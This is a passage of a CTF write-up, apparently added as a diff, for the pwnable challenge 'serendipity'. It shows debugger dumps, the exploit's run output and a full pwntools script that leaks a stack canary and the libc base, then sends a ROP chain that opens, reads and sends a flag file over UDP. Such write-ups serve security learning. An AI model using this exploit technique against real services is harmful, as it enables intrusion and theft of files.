+Fortunately, before it execute our rop chain, the r8 registers has been point to our sockaddr struct 
+
+```c
+ RAX  0x0
+ RBX  0x7f744c1fe640 ◂— 0x7f744c1fe640
+ RCX  0x7f744cb27c56 (sendto+118) ◂— cmp rax, -0x1000 /* 'H=' */
+*RDX  0x0
+ RDI  0x0
+ RSI  0x560df594a3d4 ◂— "file can't be read\n"
+ R8   0x560df594a3c0 ◂— 0x100007fa8d10002  // our sockaddr struct
+ R9   0x10
+ R10  0x0
+ R11  0x293
+ R12  0x7f744c1fe640 ◂— 0x7f744c1fe640
+ R13  0x0
+ R14  0x7f744ca947d0 (start_thread) ◂— endbr64 
+ R15  0x7ffed7952e20 ◂— 0x0
+ RBP  0x7f744c1fde50 ◂— 0x4141414141414141 ('AAAAAAAA')
+ RSP  0x7f744c1fdaf0 ◂— 0x0
+*RIP  0x560df4890e70 ◂— je 0x560df4890e77
+*EFLAGS 0x246 [ cf PF af ZF sf IF df of ]
+──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────
+   0x560df4890d19                             call   0x560df48909b9                <0x560df48909b9>
+ 
+   0x560df4890d1e                             mov    eax, 0
+   0x560df4890d23                             jmp    0x560df4890e63                <0x560df4890e63>
+    ↓
+   0x560df4890e63                             mov    rdx, qword ptr [rbp - 8]
+   0x560df4890e67                             sub    rdx, qword ptr fs:[0x28]
+ ► 0x560df4890e70                           ✔ je     0x560df4890e77                <0x560df4890e77>
+    ↓
+   0x560df4890e77                             leave  
+   0x560df4890e78                             ret    
+    ↓
+   0x7f744ca2a3e5 <iconv+197>                 pop    rdi
+   0x7f744ca2a3e6 <iconv+198>                 ret    
+    ↓
+   0x7f744ca796a2 <printf_positional+5666>    pop    rdx
+────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7f744c1fdaf0 ◂— 0x0
+01:0008│     0x7f744c1fdaf8 —▸ 0x560df598b360 —▸ 0x560df594a3c0 ◂— 0x100007fa8d10002
+02:0010│     0x7f744c1fdb00 ◂— 0x0
+03:0018│     0x7f744c1fdb08 ◂— 0x0
+04:0020│     0x7f744c1fdb10 —▸ 0x560df594a3c0 ◂— 0x100007fa8d10002
+05:0028│     0x7f744c1fdb18 —▸ 0x7f7444000b70 ◂— 0xc7ccaec0fbfe94bc
+06:0030│     0x7f744c1fdb20 ◂— 0x0
+07:0038│     0x7f744c1fdb28 ◂— 0x0
+──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x560df4890e70
+   1   0x7f744ca2a3e5 iconv+197
+   2   0x7f744ca796a2 printf_positional+5666
+   3   0x7f744ca796a2 printf_positional+5666
+   4   0x7f744ca796a2 printf_positional+5666
+──────────────────────────────────────────────────────────────────────────────────[ THREADS (3 TOTAL) ]──────────────────────────────────────────────────────────────────────────────────
+  ► 3   "serendipity_pat" stopped: 0x560df4890e70
+    1   "serendipity_pat" stopped: 0x7f744cb1b82d <select+349> 
+    2   "serendipity_pat" stopped: 0x7f744cae57f8 <clock_nanosleep@GLIBC_2.2.5+200> 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> 
+```
+
+So, finally we set those arguments respectively
+
+```c
+ ► 0x7f744cb4101b <__netlink_close+11>        syscall  <SYS_sendto>
+        fd: 0xb (socket:[153083])
+        buf: 0x7f744cc1a8c8 (buffer) ◂— 'server_flag\nlag'
+        n: 0xc
+        flags: 0x0
+        addr: 0x560df594a3c0 ◂— 0x100007fa8d10002
+        addr_len: 0x10
+   0x7f744cb4101d <__netlink_close+13>        ret  
+```
+
+
+Result:
+```c
+╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                       1 ✘  w1n_gl0ry@phis1Ng ─╮
+╰─ python3 remote.py                                                                                                                                               ─╯
+[*] '/home/w1n_gl0ry/CTF/Pwnable/2023/wc2023/serendipity/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 0 on port 9981: Done
+bc94fefbc0aeccc762678d353d911917c32ce5266a0df70afd4bef072fb147ec
+b'auth successfully\n'
+[*] canary: 0x63648f5a8f209500
+[*] libc.address: 0x7f744ca00000
+[*] Paused (press any to continue)
+b"In the moon's tender embrace, shadows waltz in a silvery dance, weaving dreams with a gentle trance.\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+[*] Switching to interactive mode
+file can't be read
+server_flag
+$ 
+```
+
+Final script:
+```python
+from pwn import *
+from ctypes import *
+import socket 
+from time import sleep 
+import sys
+
+libc=ELF('./libc.so.6')
+glibc = cdll.LoadLibrary('libc.so.6')
+#io=remote('157.245.147.89', 24210, typ="udp")
+io=remote('0', 9981, typ='udp')
+
+opcode=[0x301, 0x101, 0x201]
+
+def printdata(size, data):
+    pl=p32(0x70303070)
+    pl+=p32(opcode[0])
+    pl+=p16(size)
+    pl+=data
+    io.send(pl)
+    
+plain=b''
+session=b''
+def genarate_rand_string(size=0, data=0):
+    global plain
+    pl=p32(0x70303070)
+    pl+=p32(opcode[1])
+    pl+=p16(size)
+    pl+=b'A'*100
+    io.send(pl)
+    glibc.srand(glibc.time(None))
+    for i in range(32):
+        plain+=p8(glibc.rand() & 0xff)    
+    print(plain.hex())
+    data= io.recv()
+    return data
+    
+def authenticate(size=0):
+    global session
+    pl=p32(0x70303070)
+    pl+=p32(opcode[2])
+    pl+=p16(0x100)
+    pl+=plain
+    io.send(pl)
+    data= io.recv()
+    session=io.recv()
+    print(data)
+    return session
+     
+genarate_rand_string()  
+a=authenticate()
+# print(a)
+# pause()
+# printdata(0xfff, b'A'*0xfff)
+# print(io.recv())
+# data=io.recv(0x1000)
+# heap=u64(data[4:10].ljust(8, b'\0')) - 0x4ba0
+# print(hex(heap))
+    
+session=a
+buf=session
+buf+=p32(0)
+buf+=p16(0x30a+1)
+buf+=b'moonlit_embrace\0'
+buf+=(778+1-len(b'moonlit_embrace\0'))*b'A'
+
+
+io.send(buf)
+data = io.recv()
+leak=u64(b'\0'+data[265:])
+log.info("canary: " + hex(leak))
+
+session=a
+buf=session
+buf+=p32(0)
+buf+=p16(0x30a+1+7+8)
+buf+=b'moonlit_embrace\0'
+buf+=(778+8-len(b'moonlit_embrace'))*b'A'
+buf+=data[265:]
+buf+=b'A'*8
+
+io.send(buf)
+
+data = io.recv()
+libc.address=u64(data[264+8+8:].ljust(8, b'\0')) - 0x94ac3
+log.info("libc.address: " + hex(libc.address))
+
+
+
+pop_rax=0x0000000000045eb0+libc.address
+bin_sh=libc.address+next(libc.search(b'/bin/sh\0'))
+pop_rdi=libc.address+0x000000000002a3e5
+pop_rsi=libc.address+0x000000000002be51
+pop_rdx=libc.address+0x00000000000796a2
+mov_rdi_rdx=libc.address+0x0000000000149709
+mov_r8_rbx=0x0000000000121f8a+libc.address
+pop_rcx_rbx=libc.address+0x0000000000108b04
+ret=pop_rdi+1
+xchg_edi_eax=0x000000000009198d+libc.address
+mov_rax_r8=0x000000000011db23+libc.address
+syscall=0x14101b+libc.address
+
+pl=b''
+pl+=p64(pop_rdi) 
+pl+=p64(libc.bss(40))
+pl+=p64(pop_rdx)
+pl+=p64(8319607999311079471)
+pl+=p64(mov_rdi_rdx)
+pl+=p64(pop_rdi)
+pl+=p64(libc.bss(40)+8)
+pl+=p64(pop_rdx)
+pl+=p64(29099040799945317)
+pl+=p64(mov_rdi_rdx)
+pl+=p64(pop_rdi)
+pl+=p64(libc.bss(40)+16)
+pl+=p64(pop_rdx)
+pl+=p64(0)
+pl+=p64(mov_rdi_rdx)
+pl+=p64(pop_rsi)
+pl+=p64(0)
+pl+=p64(pop_rdx)
+pl+=p64(0)
+pl+=p64(pop_rdi)
+pl+=p64(libc.bss(40))
+pl+=p64(pop_rax)
+pl+=p64(2)
+pl+=p64(syscall)
+pl+=p64(xchg_edi_eax)
+pl+=p64(pop_rsi)
+pl+=p64(libc.bss(40))
+pl+=p64(pop_rdx)
+pl+=p64(0x100)
+pl+=p64(pop_rax)
+pl+=p64(0)
+pl+=p64(syscall)
+pl+=p64(pop_rcx_rbx)
+pl+=p64(0)
+pl+=p64(0)
+pl+=p64(pop_rdi)
+pl+=p64(0xb)
+pl+=p64(pop_rdx)
+pl+=p64(12)
+pl+=p64(pop_rax)
+pl+=p64(44)
+pl+=p64(syscall)
+
+
+session=a
+buf=session
+buf+=p32(0)
+buf+=p16(0x500)
+buf+=b'moonlit_embrace\0'
+buf+=(778-len(b'moonlit_embrace\0'))*b'A'
+buf+=p64(leak)
+buf+=b'A'*8
+buf+=pl
+io.send(buf)
+
+pause()
+session=a
+buf=session
+buf+=p32(0)
+buf+=p16(0x100)
+buf+=b'moonlit_embraceaaa'
+
+io.send(buf)
+data = io.recv()
+print(data)
+
+io.interactive()
+```
+
+### a few thin confessions 
+
+- I spent 10 hours debugging each one
+- I didn't realize the mistake while doing the test and kept spending hours thinking about it, a bit of a joke :(
+- After this contest, I learned many things, and I should realize that I should not focus on one direction too much.
+- See you again
+
